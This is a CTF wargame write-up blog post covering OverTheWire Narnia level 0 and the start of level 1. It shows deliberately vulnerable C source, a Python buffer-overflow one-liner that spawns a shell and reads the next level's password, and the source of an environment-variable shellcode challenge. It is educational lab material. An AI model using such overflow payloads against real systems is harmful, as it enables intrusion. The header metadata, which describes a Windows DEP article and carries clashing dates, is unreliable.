---
layout: post
title:  Wargame Write-up OverTheWire Narnia
author: Clarissa Podell
date:   2018-09-01
description: Article on bypassing data execution prevention in Windows 10
excerpt: Article on bypassing data execution prevention in Windows 10
comments: false
mathjax: false
toc: true
last_modified_at: 2017-03-09T13:01:27-05:00
categories:
   - linux
   - wargame/ctf
tags:
   - linux
   - wargame/ctf
   - exploit
---

# Introduction to Narnia

What follows below is the original description of narnia, copied from intruded.net:

> Summary:
Difficulty:     2/10
Levels:         10
Platform:   Linux/x86
Description:
This wargame is for the ones that want to learn basic exploitation. You can see the most
common bugs in this game and we've tried to make them easy to exploit. You'll get the
source code of each level to make it easier for you to spot the vuln and abuse it. The
difficulty of the game is somewhere between Leviathan and Behemoth, but some of the
levels could be quite tricky.

Narnia’s levels are called narnia0, narnia1, … etc. and can be accessed on narnia.labs.overthewire.org through SSH on port 2226.

Data for the levels can be found in /narnia/.

SSH Information
Host: narnia.labs.overthewire.org
Port: 2226

```
clarissa@ubuntu:~$ ssh narnia0@narnia.labs.overthewire.org -p 2226
```

## Level 0

To login to the first level use:
Username: narnia0
Password: narnia0

narnia0@narnia:~$ cd /narnia/
narnia0@narnia:/narnia$ ls
narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c

```c
narnia0@narnia:/narnia$ cat narnia0.c
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
    }
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```

to keep shell open. The trick is to append the cat command to the input

cat /etc/narnia_pass/narnia1
efeidiedae

20 characters plus a further 4 is enough to change val. Let's write in the correct value, reversed of course because of the endian notation.


```bash
narnia0@narnia:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
```

Correct answer but no shell ?!?

```bash
narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae

```

## Level 1

ENV VAR, SHELLCODE INJ

```c
narnia1@narnia:/narnia$ cat narnia1.c
#include <stdio.h>

int main(){
	int (*ret)();

	if(getenv("EGG")==NULL){    
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}
```
